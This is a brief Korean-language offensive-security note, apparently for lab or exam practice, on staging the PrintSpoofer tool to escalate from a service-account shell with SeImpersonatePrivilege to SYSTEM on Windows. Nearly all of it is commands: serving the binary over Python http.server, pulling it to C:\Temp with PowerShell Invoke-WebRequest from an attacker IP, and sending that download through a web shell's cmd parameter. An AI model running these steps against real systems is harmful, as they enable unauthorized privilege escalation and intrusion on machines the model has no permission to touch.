- SeImpersonatePrivilege 악용 도구 PrintSpoofer64.exe를 Kali(windows-resources 패키지 또는 GitHub 릴리스)에서 준비해 http.server로 타깃에 전송하는 준비 노트
- 웹셸(IIS AppPool)·MSSQL 같은 서비스 계정 셸에서 SeImpersonate를 발견하고 SYSTEM 상승 도구를 타깃에 올릴 때
- Kali에 windows-binaries/windows-resources 패키지 설치(또는 GitHub에서 wget), 타깃에서 공격자 http.server 접근 가능, 타깃 쓰기 가능 경로(C:\Temp) 필요

sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe

- kali install
  sudo apt update && sudo apt install windows-binaries

- local
  python3 -m http.server 80

- target
  powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"

```ps1
http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
```
